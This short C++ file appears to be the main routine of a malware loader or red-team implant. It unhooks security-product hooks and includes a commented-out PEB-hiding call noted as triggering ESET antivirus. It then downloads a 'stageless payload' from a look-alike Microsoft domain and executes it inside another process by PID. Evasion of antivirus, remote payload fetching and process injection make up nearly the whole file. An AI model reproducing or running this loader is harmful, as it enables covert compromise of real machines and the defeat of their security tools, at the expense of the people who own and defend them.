#include <Windows.h>
#include <winhttp.h>
#include <iostream>
#include "Ven.h"



int main()
{
    unhook();

    // triggers ESET AV
    //hidePEB();

    DWORD pid = GetPID();
    
    // Raw stageless payload targetting microsoft.lestutosdeprocessus.fr
    std::vector<BYTE> sh = Download(L"microsoft.lestutosdeprocessus.fr\0", L"/payload.bin\0");

    execution(sh, pid);
}